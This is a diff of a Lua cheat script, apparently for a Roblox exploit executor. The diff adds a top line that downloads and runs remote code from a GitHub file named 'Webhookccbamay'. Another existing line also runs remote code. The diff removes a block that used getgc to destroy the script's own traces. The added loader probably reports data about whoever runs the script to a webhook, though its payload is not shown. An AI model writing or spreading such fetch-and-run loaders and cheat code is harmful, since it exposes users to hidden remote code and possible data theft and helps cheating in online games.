@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Ditnemay/main/Webhookccbamay"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Ditmemay/main/Thongbao"))()
 task.wait(0.05)
@@ -59,26 +59,6 @@ fade(main,1); fade(sub,1)
 task.wait(1.5)
 pcall(function() guiIntro:Destroy() end)
 
-local plr = game:GetService("Players").LocalPlayer
-if plr:FindFirstChild("PlayerGui") then
-    for _, guiName in ipairs({"BeastCooldownUI","BeastBanner","IntroGui"}) do
-        local g = plr.PlayerGui:FindFirstChild(guiName)
-        if g then g:Destroy() end
-    end
-end
-
-if getgc then
-    for _, obj in ipairs(getgc()) do
-        if typeof(obj) == "function" then
-            local env = getfenv(obj)
-            if env and env.script and env.script.Name == script.Name then
-                pcall(function()
-                    env.script:Destroy()
-                end)
-            end
-        end
-    end
-end
 
 -- Cave check
 local caveMin, caveMax = Vector3.new(-275,-10,-275), Vector3.new(-179,45,-179)
